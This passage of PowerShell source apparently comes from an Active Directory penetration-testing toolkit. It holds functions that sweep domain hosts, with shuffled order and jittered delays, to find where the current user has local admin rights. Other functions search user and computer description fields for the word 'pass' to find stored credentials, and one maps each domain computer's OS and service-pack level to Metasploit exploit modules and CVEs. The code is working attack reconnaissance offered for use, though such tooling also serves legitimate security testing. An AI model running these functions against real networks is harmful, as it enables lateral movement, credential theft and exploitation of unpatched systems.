        http://www.harmj0y.net/blog/penetesting/finding-local-admin-with-the-veil-framework/
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,

        [String]
        $HostList,

        [String]
        $HostFilter,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [double]
        $Jitter = .3,

        [String]
        $Domain
    )

    begin {

        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # get the current user
        $CurrentUser = Get-NetCurrentUser

        # random object for delay
        $randNo = New-Object System.Random

        # get the target domain
        if($Domain){
            $targetDomain = $Domain
        }
        else{
            # use the local domain
            $targetDomain = $null
        }

        Write-Verbose "[*] Running Find-LocalAdminAccess with delay of $Delay"
        if($targetDomain){
            Write-Verbose "[*] Domain: $targetDomain"
        }

        # if we're using a host list, read the targets in and add them to the target list
        if($HostList){
            if (Test-Path -Path $HostList){
                $Hosts = Get-Content -Path $HostList
            }
            else{
                Write-Warning "[!] Input file '$HostList' doesn't exist!"
                return
            }
        }
        elseif($HostFilter){
            Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'"
            $Hosts = Get-NetComputer -Domain $targetDomain -HostName $HostFilter
        }

    }

    process {

        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $targetDomain for hosts..."
            $Hosts = Get-NetComputer -Domain $targetDomain
        }

        # randomize the host list
        $Hosts = Get-ShuffledArray $Hosts

        if(-not $NoPing){
            $Hosts = $Hosts | Invoke-Ping
        }

        $counter = 0

        foreach ($server in $Hosts){

            $counter = $counter + 1

            Write-Verbose "[*] Enumerating server $server ($counter of $($Hosts.count))"

            # sleep for our semi-randomized interval
            Start-Sleep -Seconds $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

            # check if the current user has local admin access to this server
            $access = Invoke-CheckLocalAdminAccess -HostName $server
            if ($access) {
                $ip = Get-HostIP -hostname $server
                Write-Verbose "[+] Current user '$CurrentUser' has local admin access on $server ($ip)"
                $server
            }
        }
    }
}


function Find-LocalAdminAccessThreaded {
    <#
        .SYNOPSIS
        Finds machines on the local domain where the current user has
        local administrator access. Uses multithreading to
        speed up enumeration.

        Idea stolen from the local_admin_search_enum post module in
        Metasploit written by:
            'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
            'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>'
            'Royce Davis "r3dy" <rdavis[at]accuvant.com>'

        Author: @harmj0y
        License: BSD 3-Clause

        .DESCRIPTION
        This function finds the local domain name for a host using Get-NetDomain,
        queries the domain for all active machines with Get-NetComputer, then for
        each server it checks if the current user has local administrator
        access using Invoke-CheckLocalAdminAccess.

        .PARAMETER Hosts
        Host array to enumerate, passable on the pipeline.

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Domain
        Domain to query for machines

        .PARAMETER MaxThreads
        The maximum concurrent threads to execute.

        .EXAMPLE
        > Find-LocalAdminAccessThreaded
        Find machines on the local domain where the current user has local
        administrator access.

        .EXAMPLE
        > Find-LocalAdminAccessThreaded -Domain testing
        Find machines on the 'testing' domain where the current user has
        local administrator access.

        .EXAMPLE
        > Find-LocalAdminAccessThreaded -HostList hosts.txt
        Find which machines in the host list the current user has local
        administrator access.

        .LINK
        https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/local_admin_search_enum.rb
        http://www.harmj0y.net/blog/penetesting/finding-local-admin-with-the-veil-framework/
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,

        [String]
        $HostList,

        [String]
        $HostFilter,

        [Switch]
        $NoPing,

        [String]
        $Domain,

        [Int]
        $MaxThreads=10
    )

    begin {
        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # get the current user
        $CurrentUser = Get-NetCurrentUser

        # random object for delay
        $randNo = New-Object System.Random

        # get the target domain
        if($Domain){
            $targetDomain = $Domain
        }
        else{
            # use the local domain
            $targetDomain = $null
        }

        Write-Verbose "[*] Running Find-LocalAdminAccessThreaded with delay of $Delay"
        if($targetDomain){
            Write-Verbose "[*] Domain: $targetDomain"
        }

        # if we're using a host list, read the targets in and add them to the target list
        if($HostList){
            if (Test-Path -Path $HostList){
                $Hosts = Get-Content -Path $HostList
            }
            else{
                Write-Warning "[!] Input file '$HostList' doesn't exist!"
                return
            }
        }
        elseif($HostFilter){
            Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'"
            $Hosts = Get-NetComputer -Domain $targetDomain -HostName $HostFilter
        }

        # script block that eunmerates a server
        # this is called by the multi-threading code later
        $EnumServerBlock = {
            param($Server, $Ping, $CurrentUser)

            $up = $true
            if($Ping){
                $up = Test-Server -Server $server
            }
            if($up){
                # check if the current user has local admin access to this server
                $access = Invoke-CheckLocalAdminAccess -HostName $server
                if ($access) {
                    $ip = Get-HostIP -hostname $server
                    Write-Verbose "[+] Current user '$CurrentUser' has local admin access on $server ($ip)"
                    $server
                }
            }
        }

        # Adapted from:
        #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
        $sessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $sessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()

        # grab all the current variables for this runspace
        $MyVars = Get-Variable -Scope 1

        # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
        $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")

        # Add Variables from Parent Scope (current runspace) into the InitialSessionState
        ForEach($Var in $MyVars) {
            If($VorbiddenVars -notcontains $Var.Name) {
            $sessionstate.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
            }
        }

        # Add Functions from current runspace to the InitialSessionState
        ForEach($Function in (Get-ChildItem Function:)) {
            $sessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
        }

        # threading adapted from
        # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
        # Thanks Carlos!
        $counter = 0

        # create a pool of maxThread runspaces
        $pool = [runspacefactory]::CreateRunspacePool(1, $MaxThreads, $sessionState, $host)
        $pool.Open()

        $jobs = @()
        $ps = @()
        $wait = @()

        $counter = 0
    }

    process {

        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $targetDomain for hosts..."
            $Hosts = Get-NetComputer -Domain $targetDomain
        }

        # randomize the host list
        $Hosts = Get-ShuffledArray $Hosts
        $HostCount = $Hosts.Count
        Write-Verbose "[*] Total number of hosts: $HostCount"

        foreach ($server in $Hosts){
            # make sure we get a server name
            if ($server -ne ''){
                Write-Verbose "[*] Enumerating server $server ($($counter+1) of $($Hosts.count))"

                While ($($pool.GetAvailableRunspaces()) -le 0) {
                    Start-Sleep -milliseconds 500
                }

                # create a "powershell pipeline runner"
                $ps += [powershell]::create()

                $ps[$counter].runspacepool = $pool

                # add the script block + arguments
                [void]$ps[$counter].AddScript($EnumServerBlock).AddParameter('Server', $server).AddParameter('Ping', -not $NoPing).AddParameter('CurrentUser', $CurrentUser)

                # start job
                $jobs += $ps[$counter].BeginInvoke();

                # store wait handles for WaitForAll call
                $wait += $jobs[$counter].AsyncWaitHandle
            }
            $counter = $counter + 1
        }
    }

    end {
        Write-Verbose "Waiting for scanning threads to finish..."

        $waitTimeout = Get-Date

        while ($($jobs | ? {$_.IsCompleted -eq $false}).count -gt 0 -or $($($(Get-Date) - $waitTimeout).totalSeconds) -gt 60) {
                Start-Sleep -milliseconds 500
            }

        # end async call
        for ($y = 0; $y -lt $counter; $y++) {

            try {
                # complete async job
                $ps[$y].EndInvoke($jobs[$y])

            } catch {
                Write-Warning "error: $_"
            }
            finally {
                $ps[$y].Dispose()
            }
        }

        $pool.Dispose()
    }
}


function Find-UserField {
    <#
        .SYNOPSIS
        Searches user object fields for a given word (default *pass*). Default
        field being searched is 'description'.

        .DESCRIPTION
        This function queries all users in the domain with Get-NetUser,
        extracts all the specified field(s) and searches for a given
        term, default "*pass*". Case is ignored.

        .PARAMETER Term
        Term to search for, default of "pass".

        .PARAMETER Field
        User field to search in, default of "description".

        .PARAMETER Domain
        Domain to search computer fields for.

        .EXAMPLE
        > Find-UserField
        Find user accounts with "pass" in the description.

        .EXAMPLE
        > Find-UserField -Field info -Term backup
        Find user accounts with "backup" in the "info" field.
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String]
        $Term = 'pass',

        [String]
        $Field = 'description',

        [String]
        $Domain
    )
    process {
        Get-NetUser -Domain $Domain -Filter "($Field=*$Term*)" | % {
            $out = new-object psobject
            $out | Add-Member Noteproperty 'User' $_.samaccountname
            $out | Add-Member Noteproperty $Field $_.$Field
            $out
        }
    }
}


function Find-ComputerField {
    <#
        .SYNOPSIS
        Searches computer object fields for a given word (default *pass*). Default
        field being searched is 'description'.

        .PARAMETER Term
        Term to search for, default of "pass".

        .PARAMETER Field
        User field to search in, default of "description".

        .PARAMETER Domain
        Domain to search computer fields for.

        .EXAMPLE
        > Find-ComputerField
        Find computer accounts with "pass" in the description.

        .EXAMPLE
        > Find-ComputerField -Field info -Term backup
        Find computer accounts with "backup" in the "info" field.
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String]
        $Term = 'pass',

        [String]
        $Field = 'description',

        [String]
        $Domain
    )
    process {
        Get-NetComputer -Domain $Domain -FullData -Filter "($Field=*$Term*)" | % {
            $out = new-object psobject
            $out | Add-Member Noteproperty 'User' $_.samaccountname
            $out | Add-Member Noteproperty $Field $_.$Field
            $out
        }
    }
}


function Get-ExploitableSystem
{
    <#
        .Synopsis
           This module will query Active Directory for the hostname, OS version, and service pack level  
           for each computer account.  That information is then cross-referenced against a list of common
           Metasploit exploits that can be used during penetration testing.
        .DESCRIPTION
           This module will query Active Directory for the hostname, OS version, and service pack level  
           for each computer account.  That information is then cross-referenced against a list of common
           Metasploit exploits that can be used during penetration testing.  The script filters out disabled
           domain computers and provides the computer's last logon time to help determine if it's been 
           decommissioned.  Also, since the script uses data tables to output affected systems the results
           can be easily piped to other commands such as test-connection or a Export-Csv.
        .EXAMPLE
           The example below shows the standard command usage.  Disabled system are excluded by default, but
           the "LastLgon" column can be used to determine which systems are live.  Usually, if a system hasn't 
           logged on for two or more weeks it's been decommissioned.      
           PS C:\> Get-ExploitableSystem -DomainController 192.168.1.1 -Credential demo.com\user | Format-Table -AutoSize
           [*] Grabbing computer accounts from Active Directory...
           [*] Loading exploit list for critical missing patches...
           [*] Checking computers for vulnerable OS and SP levels...
           [+] Found 5 potentially vulnerabile systems!
           ComputerName          OperatingSystem         ServicePack    LastLogon            MsfModule                                      CVE                      
           ------------          ---------------         -----------    ---------            ---------                                      ---                      
           ADS.demo.com          Windows Server 2003     Service Pack 2 4/8/2015 5:46:52 PM  exploit/windows/dcerpc/ms07_029_msdns_zonename http://www.cvedetails....
           ADS.demo.com          Windows Server 2003     Service Pack 2 4/8/2015 5:46:52 PM  exploit/windows/smb/ms08_067_netapi            http://www.cvedetails....
           ADS.demo.com          Windows Server 2003     Service Pack 2 4/8/2015 5:46:52 PM  exploit/windows/smb/ms10_061_spoolss           http://www.cvedetails....
           LVA.demo.com          Windows Server 2003     Service Pack 2 4/8/2015 1:44:46 PM  exploit/windows/dcerpc/ms07_029_msdns_zonename http://www.cvedetails....
           LVA.demo.com          Windows Server 2003     Service Pack 2 4/8/2015 1:44:46 PM  exploit/windows/smb/ms08_067_netapi            http://www.cvedetails....
           LVA.demo.com          Windows Server 2003     Service Pack 2 4/8/2015 1:44:46 PM  exploit/windows/smb/ms10_061_spoolss           http://www.cvedetails....
           assess-xppro.demo.com Windows XP Professional Service Pack 3 4/1/2014 11:11:54 AM exploit/windows/smb/ms08_067_netapi            http://www.cvedetails....
           assess-xppro.demo.com Windows XP Professional Service Pack 3 4/1/2014 11:11:54 AM exploit/windows/smb/ms10_061_spoolss           http://www.cvedetails....
           HVA.demo.com          Windows Server 2003     Service Pack 2 11/5/2013 9:16:31 PM exploit/windows/dcerpc/ms07_029_msdns_zonename http://www.cvedetails....
           HVA.demo.com          Windows Server 2003     Service Pack 2 11/5/2013 9:16:31 PM exploit/windows/smb/ms08_067_netapi            http://www.cvedetails....
           HVA.demo.com          Windows Server 2003     Service Pack 2 11/5/2013 9:16:31 PM exploit/windows/smb/ms10_061_spoolss           http://www.cvedetails....
           DB1.demo.com          Windows Server 2003     Service Pack 2 3/22/2012 5:05:34 PM exploit/windows/dcerpc/ms07_029_msdns_zonename http://www.cvedetails....
           DB1.demo.com          Windows Server 2003     Service Pack 2 3/22/2012 5:05:34 PM exploit/windows/smb/ms08_067_netapi            http://www.cvedetails....
           DB1.demo.com          Windows Server 2003     Service Pack 2 3/22/2012 5:05:34 PM exploit/windows/smb/ms10_061_spoolss           http://www.cvedetails....                     
        .EXAMPLE
           The example below shows how to write the output to a csv file.
           PS C:\> Get-ExploitableSystem -DomainController 192.168.1.1 -Credential demo.com\user | Export-Csv c:\temp\output.csv -NoTypeInformation
        .EXAMPLE
           The example below shows how to pipe the resultant list of computer names into the test-connection to determine if they response to ping
           requests.
           PS C:\> Get-ExploitableSystem -DomainController 192.168.1.1 -Credential demo.com\user | Test-Connection
         .LINK
           http://www.netspi.com
           https://github.com/nullbind/Powershellery/blob/master/Stable-ish/ADS/Get-ExploitableSystems.psm1
           
         .NOTES
           Author: Scott Sutherland - 2015, NetSPI
           Version: Get-ExploitableSystem.psm1 v1.0
           Comments: The technique used to query LDAP was based on the "Get-AuditDSComputerAccount" 
           function found in Carols Perez's PoshSec-Mod project.  The general idea is based off of  
           Will Schroeder's "Invoke-FindVulnSystems" function from the PowerView toolkit.
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [String]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000.")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [String]$SearchScope = "Subtree",

        [Parameter(Mandatory=$false,
        HelpMessage="Distinguished Name Path to limit search to.")]

        [String]$SearchDN
    )
    Begin
    {
        if ($DomainController -and $Credential.GetNetworkCredential().Password)
        {
            $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }
        else
        {
            $objDomain = [ADSI]""  
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }
    }

    Process
    {
        # Status user
        Write-Verbose "[*] Grabbing computer accounts from Active Directory..."

        # Create data table for hostnames, os, and service packs from LDAP
        $TableAdsComputers = New-Object System.Data.DataTable 
        $TableAdsComputers.Columns.Add('Hostname') | Out-Null        
        $TableAdsComputers.Columns.Add('OperatingSystem') | Out-Null
        $TableAdsComputers.Columns.Add('ServicePack') | Out-Null
        $TableAdsComputers.Columns.Add('LastLogon') | Out-Null

        # ----------------------------------------------------------------
        # Grab computer account information from Active Directory via LDAP
        # ----------------------------------------------------------------
        $CompFilter = "(&(objectCategory=Computer))"
        $ObjSearcher.PageSize = $Limit
        $ObjSearcher.Filter = $CompFilter
        $ObjSearcher.SearchScope = "Subtree"

        if ($SearchDN)
        {
            $objSearcher.SearchDN = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($SearchDN)")
        }

        $ObjSearcher.FindAll() | ForEach-Object {

            # Setup fields
            $CurrentHost = $($_.properties['dnshostname'])
            $CurrentOs = $($_.properties['operatingsystem'])
            $CurrentSp = $($_.properties['operatingsystemservicepack'])
            $CurrentLast = $($_.properties['lastlogon'])
            $CurrentUac = $($_.properties['useraccountcontrol'])

            # Convert useraccountcontrol to binary so flags can be checked
            # http://support.microsoft.com/en-us/kb/305144
            # http://blogs.technet.com/b/askpfeplat/archive/2014/01/15/understanding-the-useraccountcontrol-attribute-in-active-directory.aspx
            $CurrentUacBin = [convert]::ToString($CurrentUac,2)

            # Check the 2nd to last value to determine if its disabled
            $DisableOffset = $CurrentUacBin.Length - 2
            $CurrentDisabled = $CurrentUacBin.Substring($DisableOffset,1)

            # Add computer to list if it's enabled
            if ($CurrentDisabled  -eq 0){
                # Add domain computer to data table
                $TableAdsComputers.Rows.Add($CurrentHost,$CurrentOS,$CurrentSP,$CurrentLast) | Out-Null 
            }            

         }

        # Status user        
        Write-Verbose "[*] Loading exploit list for critical missing patches..."

        # ----------------------------------------------------------------
        # Setup data table for list of msf exploits
        # ----------------------------------------------------------------
    
        # Create data table for list of patches levels with a MSF exploit
        $TableExploits = New-Object System.Data.DataTable 
        $TableExploits.Columns.Add('OperatingSystem') | Out-Null 
        $TableExploits.Columns.Add('ServicePack') | Out-Null
        $TableExploits.Columns.Add('MsfModule') | Out-Null  
        $TableExploits.Columns.Add('CVE') | Out-Null
        
        # Add exploits to data table
        $TableExploits.Rows.Add("Windows 7","","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/dcerpc/ms07_029_msdns_zonename","http://www.cvedetails.com/cve/2007-1748") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms06_066_nwapi","http://www.cvedetails.com/cve/2006-4688") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms06_070_wkssvc","http://www.cvedetails.com/cve/2006-4691") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/smb/ms05_039_pnp","http://www.cvedetails.com/cve/2005-1983") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/dcerpc/ms07_029_msdns_zonename","http://www.cvedetails.com/cve/2007-1748") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/smb/ms06_066_nwapi","http://www.cvedetails.com/cve/2006-4688") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Service Pack 2","exploit/windows/dcerpc/ms07_029_msdns_zonename","http://www.cvedetails.com/cve/2007-1748") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Service Pack 2","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003 R2","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003 R2","","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003 R2","","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003 R2","","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2008","Service Pack 2","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2008","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2008","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2008","","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2008","","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2008 R2","","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","Server Pack 1","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","Server Pack 1","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","Server Pack 1","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","Service Pack 2","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/smb/ms05_039_pnp","http://www.cvedetails.com/cve/2005-1983") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms06_066_nwapi","http://www.cvedetails.com/cve/2006-4688") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms06_070_wkssvc","http://www.cvedetails.com/cve/2006-4691") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 3","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 3","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
